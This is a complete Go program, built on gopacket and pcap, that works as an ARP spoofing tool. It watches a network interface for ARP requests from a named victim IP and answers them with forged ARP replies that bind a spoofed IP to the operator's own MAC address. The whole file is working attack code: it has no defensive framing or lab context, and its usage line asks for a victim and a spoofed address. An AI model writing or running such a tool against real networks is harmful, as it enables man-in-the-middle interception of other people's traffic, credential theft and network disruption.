package main

import (
	"errors"
	"fmt"
	"net"
	"os"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const (
	macAddrLen = 6
	ipAddrLen  = 4
	snapLen    = 1600
)

func getLocalMACIP(ifname string) (net.HardwareAddr, net.IP, error) {
	iface, err := net.InterfaceByName(ifname)
	if err != nil {
		return nil, nil, err
	}
	if len(iface.HardwareAddr) != macAddrLen {
		return nil, nil, fmt.Errorf("invalid MAC address for %s", ifname)
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return nil, nil, err
	}
	for _, addr := range addrs {
		var ip net.IP
		switch v := addr.(type) {
		case *net.IPNet:
			ip = v.IP
		case *net.IPAddr:
			ip = v.IP
		}
		if ip4 := ip.To4(); ip4 != nil {
			return iface.HardwareAddr, ip4, nil
		}
	}

	return nil, nil, fmt.Errorf("no IPv4 address found for %s", ifname)
}

func parseIPv4(s string) (net.IP, error) {
	ip := net.ParseIP(s).To4()
	if ip == nil {
		return nil, fmt.Errorf("invalid IPv4 address: %s", s)
	}
	return ip, nil
}

func sendARPReply(handle *pcap.Handle, senderMAC net.HardwareAddr, senderIP net.IP, targetMAC net.HardwareAddr, targetIP net.IP) error {
	eth := &layers.Ethernet{
		SrcMAC:       senderMAC,
		DstMAC:       targetMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     macAddrLen,
		ProtAddressSize:   ipAddrLen,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(senderMAC),
		SourceProtAddress: []byte(senderIP.To4()),
		DstHwAddress:      []byte(targetMAC),
		DstProtAddress:    []byte(targetIP.To4()),
	}

	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true}, eth, arp); err != nil {
		return err
	}
	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		return err
	}

	fmt.Printf("[+] Sent ARP reply: %s is at %s\n", senderIP, senderMAC)
	return nil
}

func run(ifname, victimIPStr, spoofedIPStr string) error {
	myMAC, myIP, err := getLocalMACIP(ifname)
	if err != nil {
		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
	}

	victimIP, err := parseIPv4(victimIPStr)
	if err != nil {
		return errors.New("invalid victim IP: " + victimIPStr)
	}
	spoofedIP, err := parseIPv4(spoofedIPStr)
	if err != nil {
		return errors.New("invalid spoofed IP: " + spoofedIPStr)
	}

	fmt.Printf("[*] Local MAC: %s\n", myMAC)
	fmt.Printf("[*] Local IP : %s\n", myIP)
	fmt.Printf("[*] Spoofing: %s claims to be %s\n", victimIPStr, spoofedIPStr)

	handle, err := pcap.OpenLive(ifname, snapLen, false, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("pcap open %s: %w\nHint: run as root or with CAP_NET_RAW/CAP_NET_ADMIN", ifname, err)
	}
	defer handle.Close()

	if err := handle.SetBPFFilter("arp"); err != nil {
		return fmt.Errorf("set BPF filter: %w", err)
	}

	fmt.Printf("[*] Listening for ARP requests on %s...\n", ifname)

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet, err := packetSource.NextPacket()
		if err != nil {
			return fmt.Errorf("read packet: %w", err)
		}

		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer == nil {
			continue
		}

		arp, ok := arpLayer.(*layers.ARP)
		if !ok || arp.Operation != layers.ARPRequest {
			continue
		}
		if !net.IP(arp.DstProtAddress).Equal(spoofedIP) {
			continue
		}
		if !net.IP(arp.SourceProtAddress).Equal(victimIP) {
			continue
		}

		senderMAC := net.HardwareAddr(append([]byte(nil), arp.SourceHwAddress...))
		senderIP := net.IP(append([]byte(nil), arp.SourceProtAddress...))

		fmt.Printf("[>] Caught ARP request for %s from %s / %s\n", spoofedIP, senderIP, senderMAC)

		if err := sendARPReply(handle, myMAC, spoofedIP, senderMAC, senderIP); err != nil {
			fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
		}
	}
}

func main() {
	if len(os.Args) != 4 {
		fmt.Fprintf(os.Stderr, "Usage: %s <interface> <victim_ip> <spoofed_ip>\n", os.Args[0])
		os.Exit(1)
	}

	if err := run(os.Args[1], os.Args[2], os.Args[3]); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
